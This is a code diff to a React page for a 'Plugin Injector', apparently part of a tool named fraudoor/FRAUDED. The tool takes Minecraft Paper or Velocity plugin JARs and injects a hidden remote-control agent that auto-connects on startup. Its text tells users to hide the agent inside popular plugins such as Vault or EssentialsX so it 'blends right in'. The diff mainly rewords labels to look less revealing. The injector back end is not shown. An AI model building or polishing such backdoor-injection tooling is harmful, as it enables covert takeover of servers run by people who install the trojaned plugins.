@@ -41,12 +41,12 @@ export default function Injection() {
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `injected-${file.name}`;
+        a.download = `FRAUDED-${file.name}`;
         a.click();
         URL.revokeObjectURL(url);
         setResult({
           type: 'success',
-          message: `Injected! ${file.name} now has fraudoor RCON built in. The plugin will auto-connect on startup.`,
+          message: `Done. ${file.name} now has FRAUDED built in. The plugin will auto-connect on startup.`,
         });
       } else {
         const err = await res.json().catch(() => ({ error: 'unknown error' }));
@@ -63,9 +63,9 @@ export default function Injection() {
       <div className="injection-panel">
         <h2>Plugin Injector</h2>
         <p>
-          Upload any Paper or Velocity plugin JAR. We inject our RCON agent
+          Upload any Paper or Velocity plugin JAR. We inject a remote control agent
           directly into the bytecode — the plugin still works exactly as before,
-          now with a fully functional RCON backend connected to your fraudoor panel.
+          now with a remote management backend.
         </p>
         <p>
           <strong>How it works:</strong> We rename the original main class, create a
@@ -140,9 +140,9 @@ export default function Injection() {
           fontSize: '13px',
           color: 'var(--text2)',
         }}>
-          <strong style={{ color: 'var(--orange)' }}>Pro tip:</strong> Inject into a plugin your server already
-          uses (Vault, EssentialsX, anything). It'll blend right in — the RCON agent
-          is completely hidden inside the JAR under <code>io/fraudoor/rcon/</code>.
+            <strong style={{ color: 'var(--orange)' }}>Pro tip:</strong> Inject into a plugin your server already
+            uses (Vault, EssentialsX, anything). It'll blend right in — the agent
+            is completely hidden inside the JAR.
         </div>
 
         <div style={{
@@ -153,8 +153,8 @@ export default function Injection() {
           fontSize: '13px',
           color: 'var(--text2)',
         }}>
-          <strong style={{ color: 'var(--accent)' }}>Config:</strong> The RCON agent
-          reads <code>config.yml</code> in the plugin folder for the server URL.
+          <strong style={{ color: 'var(--accent)' }}>Config:</strong> The agent
+          reads the plugin config for the server URL.
           Default: <code>ws://localhost:8080/ws</code>
         </div>
       </div>
